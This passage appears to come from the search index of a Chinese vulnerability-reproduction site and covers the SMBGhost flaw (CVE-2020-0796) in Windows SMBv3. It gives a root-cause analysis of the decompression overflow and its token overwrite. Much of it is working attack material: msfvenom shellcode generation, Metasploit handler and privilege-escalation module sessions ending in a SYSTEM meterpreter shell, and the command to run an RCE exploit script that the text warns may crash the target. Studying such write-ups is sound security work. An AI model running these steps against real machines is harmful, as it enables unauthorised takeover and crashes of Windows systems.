exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP \u00b6 Github CVE-2020-0796 RCE EXP msfvenom\u751f\u6210reversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py \u5c06\u751f\u6210exp.py\u4e2d\u7684shellcode\u66ff\u6362exploit.py\u4e2d\u7684shellcode [!NOTE] buf \u8981\u66ff\u6362\u4e3a USER_PAYLOAD \u4f7f\u7528 MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit \u6267\u884c\u811a\u672c\u5373\u53ef python3 exploit.py -ip 192.168.1.110 [!NOTE] \u6ce8\u610f\u6709\u84dd\u5c4f\u6982\u7387 \u53c2\u8003\u6587\u7ae0 \u00b6 Windows SMB Ghost\uff08CVE-2020-0796\uff09\u6f0f\u6d1e\u5206\u6790","title":"Windows SMB\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-0796"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#windows-smb\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2020-0796","text":"","title":"Windows SMB\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-0796"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e743\u670810\u65e5\uff0c\u5fae\u8f6f\u5728\u5176\u5b98\u65b9SRC\u53d1\u5e03\u4e86CVE-2020-0796\u7684\u5b89\u5168\u516c\u544a\uff08ADV200005\uff0cMicrosoftGuidance for Disabling SMBv3 Compression\uff09,\u516c\u544a\u8868\u793a\u5728Windows SMBv3\u7248\u672c\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u540c\u65f6\u6307\u51fa\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8eMicroSoft Server Message Block 3.1.1\u534f\u8bae\u5904\u7406\u7279\u5b9a\u8bf7\u6c42\u5305\u7684\u529f\u80fd\u4e2d\uff0c\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u5728\u76ee\u6807SMB Server\u6216\u8005Client\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] SMB\u7248\u672c v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation)","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u73af\u5883\u642d\u5efa","text":"\u5728 MSDN \u4e0a\u4e0b\u8f7d\u5bf9\u5e94\u7684\u5b58\u5728\u6f0f\u6d1e\u7684\u7cfb\u7edf\u7248\u672c \u5b89\u88c5\u540e\u6267\u884c\u547d\u4ee4 winver \u67e5\u770b\u7cfb\u7edf\u7248\u672c\uff0c\u5e76\u67e5\u770b\u662f\u5426\u542b\u6709 KB4551762\u8865\u4e01","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u6f0f\u6d1e\u539f\u7406","text":"CVE-2020-0796\u6f0f\u6d1e\u5b58\u5728\u4e8e\u53d7\u5f71\u54cd\u7248\u672c\u7684Windows\u9a71\u52a8srv2.sys\u4e2d\u3002Windows SMB v3.1.1 \u7248\u672c\u589e\u52a0\u4e86\u5bf9\u538b\u7f29\u6570\u636e\u7684\u652f\u6301\u3002\u56fe2\u6240\u793a\u4e3a\u5e26\u538b\u7f29\u6570\u636e\u7684SMB\u6570\u636e\u62a5\u6587\u7684\u6784\u6210\u3002 ProtocolId\uff1a4\u5b57\u8282\uff0c\u56fa\u5b9a\u4e3a0x424D53FC OriginalComressedSegmentSize\uff1a4\u5b57\u8282\uff0c\u539f\u59cb\u7684\u672a\u538b\u7f29\u6570\u636e\u5927\u5c0f CompressionAlgorithm\uff1a2\u5b57\u8282\uff0c\u538b\u7f29\u7b97\u6cd5 Flags\uff1a2\u5b57\u8282\uff0c\u8be6\u89c1\u534f\u8bae\u6587\u6863 Offset/Length\uff1a\u6839\u636eFlags\u7684\u53d6\u503c\u4e3aOffset\u6216\u8005Length\uff0cOffset\u8868\u793a\u6570\u636e\u5305\u4e2d\u538b\u7f29\u6570\u636e\u76f8\u5bf9\u4e8e\u5f53\u524d\u7ed3\u6784\u7684\u504f\u79fb srv2.sys\u4e2d\u5904\u7406SMBv3\u538b\u7f29\u6570\u636e\u5305\u7684\u89e3\u538b\u51fd\u6570Srv2DecompressData\u672a\u4e25\u683c\u6821\u9a8c\u6570\u636e\u5305\u4e2dOriginalCompressedSegmentSize\u548cOffset/Length\u5b57\u6bb5\u7684\u5408\u6cd5\u6027\u3002\u800c\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u5f71\u54cd\u4e86Srv2DecompressData\u4e2d\u5185\u5b58\u5206\u914d\u51fd\u6570SrvNetAllocateBuffer\u7684\u53c2\u6570\u3002\u5982\u56fe4\u6240\u793a\u7684Srv2DecompressData\u51fd\u6570\u53cd\u7f16\u8bd1\u4ee3\u7801\uff0cSrvNetAllocateBuffer\u5b9e\u9645\u7684\u53c2\u6570\u4e3aOriginalCompressedSegmentSize+Offset\u3002\u8fd9\u4e24\u4e2a\u53c2\u6570\u90fd\u76f4\u63a5\u6765\u6e90\u4e8e\u6570\u636e\u5305\u4e2dSMB Compression Transform Header\u4e2d\u7684\u5b57\u6bb5\uff0c\u800c\u51fd\u6570\u5e76\u672a\u5224\u65ad\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5426\u5408\u6cd5\uff0c\u5c31\u76f4\u63a5\u5c06\u5176\u76f8\u52a0\u540e\u4f5c\u4e3a\u5185\u5b58\u5206\u914d\u7684\u53c2\u6570(unsigned int\u7c7b\u578b\uff09\u3002 \u8fd9\u91cc\uff0cOriginalCompressedSegmentSize+Offset\u53ef\u80fd\u5c0f\u4e8e\u5b9e\u9645\u9700\u8981\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4ece\u800c\u5728\u540e\u7eed\u8c03\u7528\u89e3\u538b\u51fd\u6570SmbCompressionDecompress\u8fc7\u7a0b\u4e2d\u5b58\u5728\u8d8a\u754c\u8bfb\u53d6\u6216\u8005\u5199\u5165\u7684\u98ce\u9669\u3002 \u76ee\u524d\u5df2\u516c\u5f00\u7684\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u672c\u5730\u63d0\u6743\u5229\u7528\u5305\u542b\u5982\u4e0b\u7684\u4e3b\u8981\u8fc7\u7a0b\uff1a \uff081\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u9996\u5148\u521b\u5efa\u5230SMS server\u7684\u4f1a\u8bdd\u8fde\u63a5\uff08\u8bb0\u4e3asession\uff09\u3002 \uff082\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u83b7\u53d6\u81ea\u8eabtoken\u6570\u636e\u7ed3\u6784\u4e2dprivilege\u6210\u5458\u5728\u5185\u6838\u4e2d\u7684\u5730\u5740\uff08\u8bb0tokenAddr\uff09\u3002 \uff083\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u901a\u8fc7session\u53d1\u9001\u7578\u5f62\u538b\u7f29\u6570\u636e\uff08\u8bb0\u4e3aevilData\uff09\u7ed9SMB server\u89e6\u53d1\u6f0f\u6d1e\u3002\u5176\u4e2d\uff0cevilData\u5305\u542btokenAddr\u3001\u6743\u9650\u6570\u636e\u3001\u6ea2\u51fa\u5360\u4f4d\u6570\u636e\u3002 \uff084\uff09 SMS server\u6536\u5230evilData\u540e\u89e6\u53d1\u6f0f\u6d1e\uff0c\u5e76\u4fee\u6539tokenAddr\u5730\u5740\u5904\u7684\u6743\u9650\u6570\u636e\uff0c\u4ece\u800c\u63d0\u5347\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u6743\u9650\u3002 \uff085\uff09\u9a8c\u8bc1\u7a0b\u5e8f\u83b7\u53d6\u6743\u9650\u540e\u5bf9winlogon\u8fdb\u884c\u63a7\u5236\uff0c\u6765\u521b\u5efasystem\u7528\u6237shell\u3002 \u9996\u5148\uff0c\u770b\u4e00\u4e0b\u5df2\u516c\u5f00\u5229\u7528\u7684evilData\u6570\u636e\u5305 \u6570\u636e\u5305\u7684\u5185\u5bb9\u5f88\u7b80\u5355\uff0c\u5176\u4e2d\u51e0\u4e2a\u5173\u952e\u5b57\u6bb5\u6570\u636e\u5982\u4e0b\uff1a OriginalSize \uff1a0xffffffff Offset\uff1a0x10 Real compressed data \uff1a13\u5b57\u8282\u7684\u538b\u7f29\u6570\u636e\uff0c\u89e3\u538b\u540e\u5e94\u4e3a1108\u5b57\u8282\u2019A\u2019\u52a08\u5b57\u8282\u7684token\u5730\u5740\u3002 SMB3 raw data \uff1a\u5b9e\u9645\u4e0a\u662f\u75312\u4e2a8\u5b57\u8282\u76840x1FF2FFFFBC\uff08\u603b\u957f0x10)\u52a0\u4e0a0x13\u5b57\u8282\u7684\u538b\u7f29\u6570\u636e\u7ec4\u6210 \u4ece\u4e0a\u9762\u7684\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ef\u77e5\uff0c\u6f0f\u6d1e\u6210\u56e0\u662fSrv2DecompressData\u51fd\u6570\u5bf9\u62a5\u6587\u5b57\u6bb5\u7f3a\u4e4f\u5408\u6cd5\u6027\u5224\u65ad\u9020\u6210\u5185\u5b58\u5206\u914d\u4e0d\u5f53\u3002\u5728\u8be5\u6f0f\u6d1e\u6570\u636e\u5305\u4e2d\uff0cOriginalSize \u662f\u4e00\u4e2a\u7578\u5f62\u503c\u3002OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf \u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u503c\uff0c\u5176\u5c06\u4f1a\u4f20\u9012\u7ed9SrvNetAllocateBuffer\u8fdb\u884c\u8c03\u7528\uff0c\u4e0b\u9762\u5177\u4f53\u5206\u6790\u5185\u5b58\u5206\u914d\u60c5\u51b5\u3002SrvNetAllocateBuffer\u7684\u53cd\u7f16\u8bd1\u4ee3\u7801 \u7531\u4e8e\u4f20\u7ed9SrvNetAllocateBuffer\u7684\u53c2\u6570\u4e3a0xf\uff0c\u6839\u636eSrvNetAllocateBuffer\u7684\u5904\u7406\u6d41\u7a0b\u53ef\u77e5\uff0c\u8be5\u8bf7\u6c42\u5185\u5b58\u5c06\u4eceSrvNetBufferLookasides\u8868\u4e2d\u5206\u914d\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u53d8\u91cfSrvDisableNetBufferLookAsideList\u8ddf\u6ce8\u518c\u8868\u9879\u76f8\u5173\uff0c\u7cfb\u7edf\u9ed8\u8ba4\u72b6\u6001\u4e0bSrvDisableNetBufferLookAsideList\u4e3a0\u3002 SrvNetBufferLookasides\u8868\u901a\u8fc7\u51fd\u6570SrvNetCreateBuffer\u521d\u59cb\u5316\uff0c\u5b9e\u9645SrvNetCreateBuffer\u5faa\u73af\u8c03\u7528\u4e86SrvNetBufferLookasideAllocate\u5206\u914d\u5185\u5b58\uff0c\u8c03\u7528SrvNetBufferLookasideAllocate\u7684\u53c2\u6570\u5206\u522b\u4e3a[\u20180x1100\u2019, \u20180x2100\u2019, \u20180x4100\u2019, \u20180x8100\u2019, \u20180x10100\u2019, \u20180x20100\u2019, \u20180x40100\u2019, \u20180x80100\u2019, \u20180x100100\u2019]\u3002\u5728\u8fd9\u91cc\uff0c\u5185\u5b58\u5206\u914d\u53c2\u6570\u4e3a0xf\uff0c\u5bf9\u5e94\u7684lookaside\u8868\u4e3a0x1100\u5927\u5c0f\u7684\u8868\u9879\u3002 SrvNetBufferLookasideAllocate\u51fd\u6570\u5b9e\u9645\u662f\u8c03\u7528SrvNetAllocateBufferFromPool\u6765\u5206\u914d\u5185\u5b58 \u5728\u51fd\u6570SrvNetAllocateBufferFromPool\u4e2d\uff0c\u5bf9\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5206\u914d\u5927\u5c0f\uff0c\u5185\u90e8\u901a\u8fc7ExAllocatePoolWithTag\u51fd\u6570\u5206\u914d\u7684\u5185\u5b58\u5b9e\u9645\u8981\u5927\u4e8e\u8bf7\u6c42\u503c\uff08\u591a\u51fa\u90e8\u5206\u7528\u4e8e\u5b58\u50a8\u90e8\u5206\u5185\u5b58\u76f8\u5173\u6570\u636e\u7ed3\u6784\uff09\u3002\u4ee5\u8bf7\u6c42\u5206\u914d0x1100\u5927\u5c0f\u4e3a\u4f8b\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u5224\u65ad\u540e\uff0c\u6700\u540e\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0fallocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)\u3002 \u5185\u5b58\u5206\u914d\u5b8c\u6bd5\u4e4b\u540e\uff0cSrvNetAllocateBufferFromPool\u51fd\u6570\u8fd8\u5bf9\u5206\u914d\u7684\u5185\u5b58\u8fdb\u884c\u4e86\u4e00\u7cfb\u5217\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u6700\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u5185\u5b58\u4fe1\u606f\u7ed3\u6784\u4f53\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u5982\u4e0b\u7684\u6570\u636e\u5173\u7cfb\uff1aSrvNetAllocateBufferFromPool\u51fd\u6570\u8fd4\u56de\u503creturn_buffer\u6307\u5411\u4e00\u4e2a\u5185\u5b58\u6570\u636e\u7ed3\u6784\uff0c\u8be5\u5185\u5b58\u6570\u636e\u7ed3\u6784\u8d77\u59cb\u5730\u5740\u540c\u5b9e\u9645\u5206\u914d\u5185\u5b58\uff08\u51fd\u6570ExAllocatePoolWithTag\u5206\u914d\u7684\u5185\u5b58\uff09\u8d77\u59cb\u5730\u5740\u7684\u7684\u504f\u79fb\u4e3a0x1150\uff1breturn_buffer+0x18\u4f4d\u7f6e\u6307\u5411\u4e86\u5b9e\u9645\u5206\u914d\u5185\u5b58\u8d77\u59cb\u5730\u5740\u504f\u79fb0x50\u4f4d\u7f6e\u5904\uff0c\u800c\u6700\u7ec8return_buffer\u4f1a\u4f5c\u4e3a\u51fd\u6570SrvNetAllocateBuffer\u7684\u8fd4\u56de\u503c \u56de\u5230\u6f0f\u6d1e\u89e3\u538b\u51fd\u6570Srv2DecompressData\uff0c\u5728\u8fdb\u884c\u5185\u5b58\u5206\u914d\u4e4b\u540e\uff0cSrv2DecompressData\u8c03\u7528\u51fd\u6570SmbCompressionDecompress\u5f00\u59cb\u89e3\u538b\u88ab\u538b\u7f29\u7684\u6570\u636e \u5b9e\u9645\u4e0a\uff0c\u8be5\u51fd\u6570\u8c03\u7528\u4e86Windows\u5e93\u51fd\u6570RtlDecompressBufferEx2\u6765\u5b9e\u73b0\u89e3\u538b\uff0c\u6839\u636eRtlDecompressBufferEx2\u7684\u51fd\u6570\u539f\u578b\u6765\u5bf9\u5e94\u5206\u6790SmbCompressionDecompress\u51fd\u6570\u7684\u5404\u4e2a\u53c2\u6570\u3002 SmbCompressionDecompress(CompressAlgo\uff0c//\u538b\u7f29\u7b97\u6cd5 Compressed_buf\uff0c//\u6307\u5411\u6570\u636e\u5305\u4e2d\u7684\u538b\u7f29\u6570\u636e Compressed_size\uff0c//\u6570\u636e\u5305\u4e2d\u538b\u7f29\u6570\u636e\u5927\u5c0f\uff0c\u8ba1\u7b97\u5f97\u5230 UnCompressedBuf,//\u89e3\u538b\u540e\u7684\u6570\u636e\u5b58\u50a8\u5730\u5740\uff0c*(alloc_buffer+0x18)+0x10 UnCompressedSize,//\u538b\u7f29\u6570\u636e\u539f\u59cb\u5927\u5c0f,\u6e90\u4e8e\u6570\u636e\u5305OriginalCompressedSegmentSize FinalUnCompressedSize)//\u6700\u7ec8\u89e3\u538b\u540e\u6570\u636e\u5927\u5c0f \u4ece\u53cd\u7f16\u8bd1\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\uff0c\u51fd\u6570SmbCompressionDecompress\u4e2d\u4fdd\u5b58\u89e3\u538b\u540e\u6570\u636e\u7684\u5730\u5740\u4e3a*(alloc_buffer+0x18)+0x10\u7684\u4f4d\u7f6e\uff0c\u6839\u636e\u5185\u5b58\u5206\u914d\u8fc7\u7a0b\u5206\u6790\uff0calloc_buffer + 0x18\u6307\u5411\u4e86\u5b9e\u9645\u5185\u5b58\u5206\u914d\u8d77\u59cb\u4f4d\u7f6e\u504f\u79fb0x50\u5904\uff0c\u6240\u4ee5\u62f7\u8d1d\u76ee\u7684\u5730\u5740\u4e3a\u5b9e\u9645\u5185\u5b58\u5206\u914d\u8d77\u59cb\u5730\u5740\u504f\u79fb0x60\u4f4d\u7f6e\u5904\u3002 \u5728\u89e3\u538b\u8fc7\u7a0b\u4e2d\uff0c\u538b\u7f29\u6570\u636e\u89e3\u538b\u540e\u5c06\u5b58\u50a8\u5230\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5185\u5b58\u4e2d\u3002\u6839\u636eevilData\u6570\u636e\u7684\u6784\u9020\u8fc7\u7a0b\uff0c\u89e3\u538b\u540e\u7684\u6570\u636e\u4e3a\u5360\u5751\u6570\u636e\u548ctokenAddr\u3002\u62f7\u8d1d\u5230\u8be5\u5904\u5730\u5740\u540e\uff0ctokenAddr\u5c06\u8986\u76d6\u539f\u5185\u5b58\u6570\u636e\u7ed3\u6784\u4e2dalloc_buffer+0x18\u5904\u7684\u6570\u636e\u3002\u4e5f\u5c31\u662f\u89e3\u538b\u7f29\u51fd\u6570SmbCompressionDecompress\u8fd4\u56de\u540e\uff0calloc_buffer+0x18\u5c06\u6307\u5411\u9a8c\u8bc1\u7a0b\u5e8f\u7684tokenAddr\u5185\u6838\u5730\u5740 \u7ee7\u7eed\u770bSrv2DecompressData\u7684\u540e\u7eed\u5904\u7406\u6d41\u7a0b\uff0c\u89e3\u538b\u6210\u529f\u540e\uff0c\u51fd\u6570\u5224\u65adoffset\u7684\u7ed3\u679c\u4e0d\u4e3a0\u3002\u4e0d\u4e3a0\u5219\u8fdb\u884c\u5185\u5b58\u79fb\u52a8\uff0c\u5185\u5b58\u62f7\u8d1d\u7684\u53c2\u6570\u5982\u4e0b\uff1a memmove(*(alloc_buffer+0x18)\uff0cSMB_payload\uff0coffset) \u6b64\u65f6alloc_buffer+0x18\u5df2\u7ecf\u6307\u5411\u9a8c\u8bc1\u7a0b\u5e8f\u7684tokenAddr\u5185\u6838\u5730\u5740\uff0c\u800cSMB_payload\u6b64\u65f6\u6307\u5411evilData\u4e2d\u7684\u6743\u9650\u6570\u636e\uff0coffset\u5219\u4e3a0x10\u3002\u56e0\u6b64\uff0c\u8fd9\u4e2a\u5185\u5b58\u79fb\u52a8\u5b8c\u6210\u540e\uff0c\u6743\u9650\u6570\u636e\u5c06\u5199\u5165tokenAddr\u5904\u3002\u8fd9\u610f\u5473\u7740\uff0cSMS Server\u6210\u529f\u4fee\u6539\u4e86\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u6743\u9650\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u9a8c\u8bc1\u7a0b\u5e8f\u7684\u63d0\u6743\uff01 \u8fd8\u6709\u4e00\u4e2a\u7ec6\u8282\u9700\u8981\u6ce8\u610f\uff0c\u5728\u89e3\u538b\u65f6\uff0cSrv2DecompressData\u51fd\u6570\u4f1a\u5224\u65ad\u5b9e\u9645\u7684\u89e3\u538b\u540e\u6570\u636e\u5927\u5c0fFinalUnCompressedSize\u662f\u5426\u548c\u6570\u636e\u5305\u4e2d\u539f\u59cb\u6570\u636e\u5927\u5c0fOriginalCompressedSegmentSize\u4e00\u81f4 \u6309\u7406\u6765\u8bf4\u5b9e\u9645\u89e3\u538b\u540e\u7684\u6570\u636e\u5927\u5c0f\u4e3a0x1100\uff0c\u4e0d\u7b49\u4e8e\u6570\u636e\u5305\u4e2d\u7684\u539f\u59cb\u538b\u7f29\u6570\u636e\u5927\u5c0f0xffffffff\uff0c\u8fd9\u91cc\u5e94\u8be5\u8fdb\u5165\u5230\u540e\u9762\u5185\u5b58\u91ca\u653e\u7684\u6d41\u7a0b\u3002\u7136\u800c\uff0c\u5b9e\u9645\u4e0a\u5728\u51fd\u6570SmbCompressionDecompress\u4e2d\uff0c\u8c03\u7528RtlDecompressBufferEx2\u6210\u529f\u540e\u4f1a\u76f4\u63a5\u5c06OriginalCompressedSegmentSize\u8d4b\u503c\u7ed9FinalUnCompressedSize\u3002\u8fd9\u4e5f\u662f\u8be5\u6f0f\u6d1e\u5173\u4e8e\u4efb\u610f\u5730\u5740\u5199\u5165\u6210\u529f\u7684\u5173\u952e\u4e4b\u4e00\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#cve-2020-0796-\u76ee\u6807\u63a2\u6d4b\u5947\u5b89\u4fe1","text":"\u4f7f\u7528\u5947\u5b89\u4fe1\u7684\u6f0f\u6d1e\u626b\u63cf\u6765\u63a2\u6d4b \u5947\u5b89\u4fe1 CVE-2020-0796 \u626b\u63cf\u4e0b\u8f7d","title":"CVE-2020-0796 \u76ee\u6807\u63a2\u6d4b(\u5947\u5b89\u4fe1)"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#cve-2020-0796-\u84dd\u5c4fexp","text":"Github CVE-2020-0796 \u84dd\u5c4fEXP \u4e0b\u8f7d \u8fd0\u884c\u811a\u672c\u540e\u76ee\u6807\u6210\u529f\u84dd\u5c4f","title":"CVE-2020-0796 \u84dd\u5c4fEXP"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#cve-2020-0796-\u672c\u5730\u63d0\u6743exp","text":"Github CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP \u4e0b\u8f7d \u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u540e\u5f39\u51facmd\u7a97\u53e3\u4e3a system\u6743\u9650 \u6216\u8005\u4f7f\u7528 MSF\u7684\u5185\u7f6eEXP windows/local/cve_2020_0796_smbghost \u6765\u672c\u5730\u63d0\u6743 msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM","title":"CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#cve-2020-0796-rce-exp","text":"Github CVE-2020-0796 RCE EXP msfvenom\u751f\u6210reversed shellcode msfvenom -p 